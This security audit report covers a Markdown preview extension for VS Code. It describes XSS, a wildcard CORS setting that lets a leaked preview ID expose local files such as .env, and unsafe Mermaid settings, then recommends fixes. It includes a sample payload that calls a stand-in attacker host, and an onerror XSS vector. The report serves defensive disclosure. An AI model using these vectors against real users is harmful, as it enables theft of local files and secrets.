# Security Inspection Report: Markdown Preview in Browser

**Date:** April 28, 2026
**Extension Name:** Markdown Preview in Browser (`markdown-preview-ext`)
**Status:** ⚠️ HIGH RISK (Not recommended for use with untrusted Markdown files)

## 1. Executive Summary
The extension provides a local HTTP server to preview Markdown files in an external browser. While the core functionality is useful, the current implementation has several critical security flaws that could allow malicious Markdown files to execute arbitrary JavaScript in your browser and potentially leak the contents of your local files (within the same directory as the Markdown file) to third-party websites.

---

## 2. Critical Vulnerabilities

### 2.1. Cross-Site Scripting (XSS) in Preview
**File:** `src/markdownRenderer.ts`
**Description:** The Markdown renderer (`markdown-it`) is configured with `html: true`, which allows raw HTML tags to be rendered directly. 
```typescript
this.md = new MarkdownIt({
    html: true, // Allows raw HTML tags
    // ...
});
```
**Impact:** A malicious Markdown file can contain `<script>` tags or other event handlers (e.g., `<img src=x onerror=...>`). When a user previews such a file, the malicious code will execute in the context of `http://localhost:[port]`. While this is an isolated origin, it can be used to perform further attacks.

### 2.2. Information Leakage & CORS Misconfiguration
**File:** `src/server.ts`
**Description:** The local server sets `Access-Control-Allow-Origin: *` for all responses and does not protect the `previewId`.
```typescript
res.setHeader('Access-Control-Allow-Origin', '*');
```
**Attack Scenario:**
1. A user previews a malicious Markdown file containing an image or link to an attacker-controlled domain: `![leak](http://attacker.com/log)`.
2. The browser sends a request to `attacker.com`. The `Referer` header will contain the full URL: `http://localhost:3000/preview/[previewId]`.
3. The attacker now knows the `previewId`.
4. Since `Access-Control-Allow-Origin` is set to `*`, the attacker's website can now use `fetch()` to read the content of the Markdown file or any file in the same directory via the `/asset/` endpoint (e.g., `.env` files, source code, etc.).
**Impact:** Potential theft of sensitive data located in the same directory as the previewed Markdown file.

---

## 3. Moderate Vulnerabilities

### 3.1. Unsafe Mermaid Configuration
**File:** `src/markdownRenderer.ts`
**Description:** Mermaid diagrams are initialized with `securityLevel: 'loose'`.
```javascript
mermaid.initialize({ ..., securityLevel: 'loose' });
```
**Impact:** This allows another vector for XSS within Mermaid diagram definitions, bypassing standard sanitization.

### 3.2. Brittle HTML Manipulation via Regex
**File:** `src/server.ts` / `src/markdownRenderer.ts`
**Description:** The extension uses regular expressions to rewrite HTML for asset paths and link targets.
**Impact:** Regex-based HTML parsing is notoriously brittle and can often be bypassed using specifically crafted HTML, leading to unexpected behavior or XSS bypasses.

---

## 4. Recommendations

### For the User:
- **Do not use** this extension to preview Markdown files from untrusted sources or in directories containing sensitive information (like `.env`, `.git`, or private keys).
- Consider using the built-in VS Code Markdown preview which runs in a highly restricted sandbox.

### For the Developer:
1. **Disable Raw HTML:** Set `html: false` in `markdown-it` configuration or use a proper sanitization library like `DOMPurify` before serving the HTML.
2. **Restrict CORS:** Change `Access-Control-Allow-Origin` from `*` to a specific origin if possible, or remove it entirely if not needed.
3. **Protect Preview ID:** Use a `Content-Security-Policy` (CSP) header to prevent the `Referer` from leaking the `previewId` to external domains (e.g., `Referrer-Policy: no-referrer`).
4. **Tighten Mermaid Security:** Set `securityLevel` to `'strict'` for Mermaid diagrams.
5. **Use a Template Engine:** Instead of manual string replacement for `{{CONTENT}}`, use a more robust templating system or DOM-based manipulation.
